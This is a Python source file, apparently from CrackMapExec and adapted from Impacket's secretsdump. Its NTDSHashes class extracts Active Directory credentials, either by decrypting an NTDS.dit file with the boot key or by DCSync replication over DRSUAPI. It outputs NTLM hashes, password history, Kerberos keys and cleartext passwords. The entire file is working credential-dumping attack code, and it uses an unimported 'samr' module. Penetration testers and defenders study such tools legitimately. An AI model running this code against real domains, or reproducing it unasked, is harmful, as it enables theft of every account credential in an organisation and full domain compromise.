from impacket.structure import Structure
from impacket.dcerpc.v5 import drsuapi
from impacket.nt_errors import STATUS_MORE_ENTRIES
from collections import OrderedDict
from impacket import ntlm
from binascii import hexlify, unhexlify
from struct import unpack
from datetime import datetime
from cme.credentials.cryptocommon import CryptoCommon
from Crypto.Cipher import DES, ARC4
from cme.credentials.commonstructs import SAMR_RPC_SID
from impacket.ese import ESENT_DB
import logging
import hashlib
import random
import string
import os
import traceback
import codecs

class NTDSHashes:
    NAME_TO_INTERNAL = {
        'uSNCreated':'ATTq131091',
        'uSNChanged':'ATTq131192',
        'name':'ATTm3',
        'objectGUID':'ATTk589826',
        'objectSid':'ATTr589970',
        'userAccountControl':'ATTj589832',
        'primaryGroupID':'ATTj589922',
        'accountExpires':'ATTq589983',
        'logonCount':'ATTj589993',
        'sAMAccountName':'ATTm590045',
        'sAMAccountType':'ATTj590126',
        'lastLogonTimestamp':'ATTq589876',
        'userPrincipalName':'ATTm590480',
        'unicodePwd':'ATTk589914',
        'dBCSPwd':'ATTk589879',
        'ntPwdHistory':'ATTk589918',
        'lmPwdHistory':'ATTk589984',
        'pekList':'ATTk590689',
        'supplementalCredentials':'ATTk589949',
        'pwdLastSet':'ATTq589920',
    }

    NAME_TO_ATTRTYP = {
        'userPrincipalName': 0x90290,
        'sAMAccountName': 0x900DD,
        'unicodePwd': 0x9005A,
        'dBCSPwd': 0x90037,
        'ntPwdHistory': 0x9005E,
        'lmPwdHistory': 0x900A0,
        'supplementalCredentials': 0x9007D,
        'objectSid': 0x90092,
    }

    ATTRTYP_TO_ATTID = {
        'userPrincipalName': '1.2.840.113556.1.4.656',
        'sAMAccountName': '1.2.840.113556.1.4.221',
        'unicodePwd': '1.2.840.113556.1.4.90',
        'dBCSPwd': '1.2.840.113556.1.4.55',
        'ntPwdHistory': '1.2.840.113556.1.4.94',
        'lmPwdHistory': '1.2.840.113556.1.4.160',
        'supplementalCredentials': '1.2.840.113556.1.4.125',
        'objectSid': '1.2.840.113556.1.4.146',
        'pwdLastSet': '1.2.840.113556.1.4.96',
    }

    KERBEROS_TYPE = {
        1:'dec-cbc-crc',
        3:'des-cbc-md5',
        17:'aes128-cts-hmac-sha1-96',
        18:'aes256-cts-hmac-sha1-96',
        0xffffff74:'rc4_hmac',
    }

    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.iteritems())

    SAM_NORMAL_USER_ACCOUNT = 0x30000000
    SAM_MACHINE_ACCOUNT     = 0x30000001
    SAM_TRUST_ACCOUNT       = 0x30000002

    ACCOUNT_TYPES = ( SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)

    class PEKLIST_ENC(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedPek',':'),
        )

    class PEKLIST_PLAIN(Structure):
        structure = (
            ('Header','32s=""'),
            ('DecryptedPek',':'),
        )

    class PEK_KEY(Structure):
        structure = (
            ('Header','1s=""'),
            ('Padding','3s=""'),
            ('Key','16s=""'),
        )

    class CRYPTED_HASH(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash','16s=""'),
        )

    class CRYPTED_HISTORY(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash',':'),
        )

    class CRYPTED_BLOB(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash',':'),
        )

    def __init__(self, ntdsFile, bootKey, logger, isRemote=False, history=False, noLMHash=True, remoteOps=None,
                 useVSSMethod=False, justNTLM=False, pwdLastSet=False, resumeSession=None, outputFileName=None):
        self.__bootKey = bootKey
        self.__logger = logger
        self.__NTDS = ntdsFile
        self.__history = history
        self.__noLMHash = noLMHash
        self.__useVSSMethod = useVSSMethod
        self.__remoteOps = remoteOps
        self.__pwdLastSet = pwdLastSet
        if self.__NTDS is not None:
            self.__ESEDB = ESENT_DB(ntdsFile, isRemote = isRemote)
            self.__cursor = self.__ESEDB.openTable('datatable')
        self.__tmpUsers = list()
        self.__PEK = list() 
        self.__cryptoCommon = CryptoCommon()
        self.__kerberosKeys = OrderedDict()
        self.__clearTextPwds = OrderedDict()
        self.__justNTLM = justNTLM
        self.__savedSessionFile = resumeSession
        self.__resumeSessionFile = None
        self.__outputFileName = outputFileName

    def getResumeSessionFile(self):
        return self.__resumeSessionFile

    def __getPek(self):
        logging.info('Searching for pekList, be patient')
        peklist = None
        while True:
            record = self.__ESEDB.getNextRow(self.__cursor)
            if record is None:
                break
            elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
                peklist =  unhexlify(record[self.NAME_TO_INTERNAL['pekList']])
                break
            elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                # Okey.. we found some users, but we're not yet ready to process them.
                # Let's just store them in a temp list
                self.__tmpUsers.append(record)
        
        if peklist is not None:
            encryptedPekList = self.PEKLIST_ENC(peklist)
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(encryptedPekList['KeyMaterial'])
            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            decryptedPekList = self.PEKLIST_PLAIN(rc4.encrypt(encryptedPekList['EncryptedPek']))
            PEKLen = len(self.PEK_KEY())
            for i in range(len( decryptedPekList['DecryptedPek'] ) / PEKLen ):
                cursor = i * PEKLen
                pek = self.PEK_KEY(decryptedPekList['DecryptedPek'][cursor:cursor+PEKLen])
                logging.info("PEK # %d found and decrypted: %s", i, hexlify(pek['Key']))
                self.__PEK.append(pek['Key'])

    def __removeRC4Layer(self, cryptedHash):
        md5 = hashlib.new('md5')
        # PEK index can be found on header of each ciphered blob (pos 8-10)
        pekIndex = hexlify(cryptedHash['Header'])
        md5.update(self.__PEK[int(pekIndex[8:10])])
        md5.update(cryptedHash['KeyMaterial'])
        tmpKey = md5.digest()
        rc4 = ARC4.new(tmpKey)
        plainText = rc4.encrypt(cryptedHash['EncryptedHash'])

        return plainText

    def __removeDESLayer(self, cryptedHash, rid):
        Key1,Key2 = self.__cryptoCommon.deriveKey(int(rid))

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        decryptedHash = Crypt1.decrypt(cryptedHash[:8]) + Crypt2.decrypt(cryptedHash[8:])

        return decryptedHash

    def __fileTimeToDateTime(self, t):
        t -= 116444736000000000
        t /= 10000000
        if t < 0:
            return 'never'
        else:
            dt = datetime.fromtimestamp(t)
            return dt.strftime("%Y-%m-%d %H:%M")

    def __decryptSupplementalInfo(self, record, prefixTable=None, keysFile=None, clearTextFile=None):
        # This is based on [MS-SAMR] 2.2.10 Supplemental Credentials Structures
        haveInfo = False
        if self.__useVSSMethod is True:
            if record[self.NAME_TO_INTERNAL['supplementalCredentials']] is not None:
                if len(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']])) > 24:
                    if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
                        domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
                        userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
                    else:
                        userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
                    cipherText = self.CRYPTED_BLOB(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']]))
                    plainText = self.__removeRC4Layer(cipherText)
                    haveInfo = True
        else:
            domain = None
            userName = None
            for attr in record['pmsgOut']['V6']['pObjects']['Entinf']['AttrBlock']['pAttr']:
                try:
                    attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                    LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
                except Exception, e:
                    logging.debug('Failed to execute OidFromAttid with error %s' % e)
                    # Fallbacking to fixed table and hope for the best
                    attId = attr['attrTyp']
                    LOOKUP_TABLE = self.NAME_TO_ATTRTYP

                if attId == LOOKUP_TABLE['userPrincipalName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            domain = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
                        except:
                            domain = None
                    else:
                        domain = None
                elif attId == LOOKUP_TABLE['sAMAccountName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            userName = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                        except:
                            logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                            userName = 'unknown'
                    else:
                        logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                        userName = 'unknown'
                if attId == LOOKUP_TABLE['supplementalCredentials']:
                    if attr['AttrVal']['valCount'] > 0:
                        blob = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                        plainText = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), blob)
                        if len(plainText) > 24:
                            haveInfo = True
            if domain is not None:
                userName = '%s\\%s' % (domain, userName)

        if haveInfo is True:
            try:
                userProperties = samr.USER_PROPERTIES(plainText)
            except:
                # On some old w2k3 there might be user properties that don't
                # match [MS-SAMR] structure, discarding them
                return
            propertiesData = userProperties['UserProperties']
            for propertyCount in range(userProperties['PropertyCount']):
                userProperty = samr.USER_PROPERTY(propertiesData)
                propertiesData = propertiesData[len(userProperty):]
                # For now, we will only process Newer Kerberos Keys and CLEARTEXT
                if userProperty['PropertyName'].decode('utf-16le') == 'Primary:Kerberos-Newer-Keys':
                    propertyValueBuffer = unhexlify(userProperty['PropertyValue'])
                    kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
                    data = kerbStoredCredentialNew['Buffer']
                    for credential in range(kerbStoredCredentialNew['CredentialCount']):
                        keyDataNew = samr.KERB_KEY_DATA_NEW(data)
                        data = data[len(keyDataNew):]
                        keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]

                        if  self.KERBEROS_TYPE.has_key(keyDataNew['KeyType']):
                            answer =  "%s:%s:%s" % (userName, self.KERBEROS_TYPE[keyDataNew['KeyType']],hexlify(keyValue))
                        else:
                            answer =  "%s:%s:%s" % (userName, hex(keyDataNew['KeyType']),hexlify(keyValue))
                        # We're just storing the keys, not printing them, to make the output more readable
                        # This is kind of ugly... but it's what I came up with tonight to get an ordered
                        # set :P. Better ideas welcomed ;)
                        self.__kerberosKeys[answer] = None
                        if keysFile is not None:
                            self.__writeOutput(keysFile, answer + '\n')
                elif userProperty['PropertyName'].decode('utf-16le') == 'Primary:CLEARTEXT':
                    # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property
                    # This credential type is the cleartext password. The value format is the UTF-16 encoded cleartext password.
                    answer = "%s:CLEARTEXT:%s" % (userName, unhexlify(userProperty['PropertyValue']).decode('utf-16le'))
                    self.__clearTextPwds[answer] = None
                    if clearTextFile is not None:
                        self.__writeOutput(clearTextFile, answer + '\n')

            if clearTextFile is not None:
                clearTextFile.flush()
            if keysFile is not None:
                keysFile.flush()

    def __decryptHash(self, record, rid=None, prefixTable=None, outputFile=None):
        if self.__useVSSMethod is True:
            logging.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])

            sid = SAMR_RPC_SID(unhexlify(record[self.NAME_TO_INTERNAL['objectSid']]))
            rid = sid.formatCanonical().split('-')[-1]

            if record[self.NAME_TO_INTERNAL['dBCSPwd']] is not None:
                encryptedLMHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['dBCSPwd']]))
                tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
                LMHash = self.__removeDESLayer(tmpLMHash, rid)
            else:
                LMHash = ntlm.LMOWFv1('', '')

            if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
                encryptedNTHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['unicodePwd']]))
                tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
                NTHash = self.__removeDESLayer(tmpNTHash, rid)
            else:
                NTHash = ntlm.NTOWFv1('', '')

            if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
                domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
                userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
            else:
                userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]

            if record[self.NAME_TO_INTERNAL['pwdLastSet']] is not None:
                pwdLastSet = self.__fileTimeToDateTime(record[self.NAME_TO_INTERNAL['pwdLastSet']])
            else:
                pwdLastSet = 'N/A'

            answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))
            if outputFile is not None:
                self.__writeOutput(outputFile, answer + '\n')

            if self.__pwdLastSet is True:
                answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
            self.__logger.highlight(answer)

            if self.__history:
                LMHistory = []
                NTHistory = []
                if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
                    encryptedLMHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['lmPwdHistory']]))
                    tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
                    for i in range(0, len(tmpLMHistory) / 16):
                        LMHash = self.__removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                        LMHistory.append(LMHash)

                if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
                    encryptedNTHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['ntPwdHistory']]))
                    tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
                    for i in range(0, len(tmpNTHistory) / 16):
                        NTHash = self.__removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                        NTHistory.append(NTHash)

                for i, (LMHash, NTHash) in enumerate(
                        map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
                    if self.__noLMHash:
                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
                    else:
                        lmhash = hexlify(LMHash)

                    answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHash))
                    if outputFile is not None:
                        self.__writeOutput(outputFile, answer + '\n')
                    self.__logger.highlight(answer)
        else:
            logging.debug('Decrypting hash for user: %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
            domain = None
            if self.__history:
                LMHistory = []
                NTHistory = []
            for attr in record['pmsgOut']['V6']['pObjects']['Entinf']['AttrBlock']['pAttr']:
                try:
                    attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                    LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
                except Exception, e:
                    logging.debug('Failed to execute OidFromAttid with error %s, fallbacking to fixed table' % e)
                    # Fallbacking to fixed table and hope for the best
                    attId = attr['attrTyp']
                    LOOKUP_TABLE = self.NAME_TO_ATTRTYP

                if attId == LOOKUP_TABLE['dBCSPwd']:
                    if attr['AttrVal']['valCount'] > 0:
                        encrypteddBCSPwd = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                        encryptedLMHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encrypteddBCSPwd)
                        LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
                    else:
                        LMHash = ntlm.LMOWFv1('', '')
                elif attId == LOOKUP_TABLE['unicodePwd']:
                    if attr['AttrVal']['valCount'] > 0:
                        encryptedUnicodePwd = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                        encryptedNTHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedUnicodePwd)
                        NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
                    else:
                        NTHash = ntlm.NTOWFv1('', '')
                elif attId == LOOKUP_TABLE['userPrincipalName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            domain = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
                        except:
                            domain = None
                    else:
                        domain = None
                elif attId == LOOKUP_TABLE['sAMAccountName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            userName = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                        except:
                            logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                            userName = 'unknown'
                    else:
                        logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                        userName = 'unknown'
                elif attId == LOOKUP_TABLE['objectSid']:
                    if attr['AttrVal']['valCount'] > 0:
                        objectSid = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    else:
                        logging.error('Cannot get objectSid for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                        objectSid = rid
                elif attId == LOOKUP_TABLE['pwdLastSet']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            pwdLastSet = self.__fileTimeToDateTime(unpack('<Q', ''.join(attr['AttrVal']['pAVal'][0]['pVal']))[0])
                        except:
                            traceback.print_exc()
                            logging.error('Cannot get pwdLastSet for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                            pwdLastSet = 'N/A'

                if self.__history:
                    if attId == LOOKUP_TABLE['lmPwdHistory']:
                        if attr['AttrVal']['valCount'] > 0:
                            encryptedLMHistory = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                            tmpLMHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedLMHistory)
                            for i in range(0, len(tmpLMHistory) / 16):
                                LMHashHistory = drsuapi.removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                                LMHistory.append(LMHashHistory)
                        else:
                            logging.debug('No lmPwdHistory for user %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
                    elif attId == LOOKUP_TABLE['ntPwdHistory']:
                        if attr['AttrVal']['valCount'] > 0:
                            encryptedNTHistory = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                            tmpNTHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedNTHistory)
                            for i in range(0, len(tmpNTHistory) / 16):
                                NTHashHistory = drsuapi.removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                                NTHistory.append(NTHashHistory)
                        else:
                            logging.debug('No ntPwdHistory for user %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])

            if domain is not None:
                userName = '%s\\%s' % (domain, userName)

            answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))

            if outputFile is not None:
                self.__writeOutput(outputFile, answer + '\n')

            if self.__pwdLastSet is True:
                answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
            self.__logger.highlight(answer)

            if self.__history:
                for i, (LMHashHistory, NTHashHistory) in enumerate(
                        map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
                    if self.__noLMHash:
                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
                    else:
                        lmhash = hexlify(LMHashHistory)

                    answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHashHistory))
                    self.__logger.highlight(answer)
                    if outputFile is not None:
                        self.__writeOutput(outputFile, answer + '\n')

        if outputFile is not None:
            outputFile.flush()

    def dump(self):
        if self.__useVSSMethod is True:
            if self.__NTDS is None:
                # No NTDS.dit file provided and were asked to use VSS
                return
        else:
            if self.__NTDS is None:
                # DRSUAPI method, checking whether target is a DC
                try:
                    self.__remoteOps.connectSamr(self.__remoteOps.getMachineNameAndDomain()[1])
                except Exception as e:
                    traceback.print_exc()
                    # Target's not a DC
                    return

        # Let's check if we need to save results in a file
        if self.__outputFileName is not None:
            logging.debug('Saving output to %s' % self.__outputFileName)
            # We have to export. Are we resuming a session?
            if self.__savedSessionFile is not None:
                mode = 'a+'
            else:
                mode = 'w+'
            hashesOutputFile = codecs.open(self.__outputFileName+'.ntds',mode, encoding='utf-8')
            if self.__justNTLM is False:
                keysOutputFile = codecs.open(self.__outputFileName+'.ntds.kerberos',mode, encoding='utf-8')
                clearTextOutputFile = codecs.open(self.__outputFileName+'.ntds.cleartext',mode, encoding='utf-8')
        else:
            hashesOutputFile = None
            keysOutputFile = None
            clearTextOutputFile = None

        self.__logger.success('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
        if self.__useVSSMethod:
            # We start getting rows from the table aiming at reaching
            # the pekList. If we find users records we stored them
            # in a temp list for later process.
            self.__getPek()
            if self.__PEK is not None:
                logging.info('Reading and decrypting hashes from %s ' % self.__NTDS)
                # First of all, if we have users already cached, let's decrypt their hashes
                for record in self.__tmpUsers:
                    try:
                        self.__decryptHash(record, outputFile=hashesOutputFile)
                        if self.__justNTLM is False:
                            self.__decryptSupplementalInfo(record, None, keysOutputFile, clearTextOutputFile)
                    except Exception as e:
                        traceback.print_exc()
                        try:
                            logging.error(
                                "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                            logging.error(str(e))
                            pass
                        except:
                            logging.error("Error while processing row!")
                            logging.error(str(e))
                            pass

                # Now let's keep moving through the NTDS file and decrypting what we find
                while True:
                    try:
                        record = self.__ESEDB.getNextRow(self.__cursor)
                    except:
                        traceback.print_exc()
                        logging.error('Error while calling getNextRow(), trying the next one')
                        continue

                    if record is None:
                        break
                    try:
                        if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                            self.__decryptHash(record, outputFile=hashesOutputFile)
                            if self.__justNTLM is False:
                                self.__decryptSupplementalInfo(record, None, keysOutputFile, clearTextOutputFile)
                    except Exception, e:
                        traceback.print_exc()
                        try:
                            logging.error(
                                "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                            logging.error(str(e))
                            pass
                        except:
                            logging.error("Error while processing row!")
                            logging.error(str(e))
                            pass
        else:
            self.__logger.success('Using the DRSUAPI method to get NTDS.DIT secrets')
            status = STATUS_MORE_ENTRIES
            enumerationContext = 0

            # Do we have to resume from a previously saved session?
            if self.__savedSessionFile is not None:
                # Yes
                try:
                    resumeFile = open(self.__savedSessionFile, 'rwb+')
                except Exception, e:
                    traceback.print_exc()
                    raise Exception('Cannot open resume session file name %s' % str(e))
                resumeSid = resumeFile.read().strip('\n')
                logging.info('Resuming from SID %s, be patient' % resumeSid)
                # The resume session file is the same as the savedSessionFile
                tmpName = self.__savedSessionFile
            else:
                resumeSid = None
                tmpName = 'sessionresume_%s' % ''.join([random.choice(string.letters) for i in range(8)])
                logging.debug('Session resume file will be %s' % tmpName)
                # Creating the resume session file
                try:
                    resumeFile = open(tmpName, 'wb+')
                    self.__resumeSessionFile = tmpName
                except Exception, e:
                    traceback.print_exc()
                    raise Exception('Cannot create resume session file %s' % str(e))

            while status == STATUS_MORE_ENTRIES:
                resp = self.__remoteOps.getDomainUsers(enumerationContext)

                for user in resp['Buffer']['Buffer']:
                    userName = user['Name']

                    userSid = self.__remoteOps.ridToSid(user['RelativeId'])
                    if resumeSid is not None:
                        # Means we're looking for a SID before start processing back again
                        if resumeSid == userSid.formatCanonical():
                            # Match!, next round we will back processing
                            resumeSid = None
                        continue

                    # Let's crack the user sid into DS_FQDN_1779_NAME
                    # In theory I shouldn't need to crack the sid. Instead
                    # I could use it when calling DRSGetNCChanges inside the DSNAME parameter.
                    # For some reason tho, I get ERROR_DS_DRA_BAD_DN when doing so.
                    crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME, drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name = userSid.formatCanonical())

                    if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                        userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
                        #userRecord.dump()
                        if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
                            raise Exception('DRSGetNCChanges didn\'t return any object!')
                    else:
                        logging.warning('DRSCrackNames returned %d items for user %s, skipping' %(crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
                    try:
                        self.__decryptHash(userRecord, user['RelativeId'],
                                           userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'],
                                           hashesOutputFile)
                        if self.__justNTLM is False:
                            self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc'][
                                'pPrefixEntry'], keysOutputFile, clearTextOutputFile)

                    except Exception, e:
                        traceback.print_exc()
                        logging.error("Error while processing user!")
                        logging.error(str(e))

                    # Saving the session state
                    resumeFile.seek(0,0)
                    resumeFile.truncate(0)
                    resumeFile.write(userSid.formatCanonical())
                    resumeFile.flush()

                enumerationContext = resp['EnumerationContext']
                status = resp['ErrorCode']

            # Everything went well and we covered all the users
            # Let's remove the resume file
            resumeFile.close()
            os.remove(tmpName)
            self.__resumeSessionFile = None

        # Now we'll print the Kerberos keys. So we don't mix things up in the output.
        if len(self.__kerberosKeys) > 0:
            if self.__useVSSMethod is True:
                logging.info('Kerberos keys from %s ' % self.__NTDS)
            else:
                logging.info('Kerberos keys grabbed')

            for itemKey in self.__kerberosKeys.keys():
                self.__logger.highlight(itemKey)

        # And finally the cleartext pwds
        if len(self.__clearTextPwds) > 0:
            if self.__useVSSMethod is True:
                logging.info('ClearText password from %s ' % self.__NTDS)
            else:
                logging.info('ClearText passwords grabbed')

            for itemKey in self.__clearTextPwds.keys():
                self.__logger.highlight(itemKey)

        # Closing output file
        if self.__outputFileName is not None:
            hashesOutputFile.close()
            if self.__justNTLM is False:
                keysOutputFile.close()
                clearTextOutputFile.close()

    @classmethod
    def __writeOutput(cls, fd, data):
        try:
            fd.write(data)
        except Exception, e:
            logging.error("Error writing entry, skippingi (%s)" % str(e))
            pass

    def finish(self):
        if self.__NTDS is not None:
            self.__ESEDB.close()
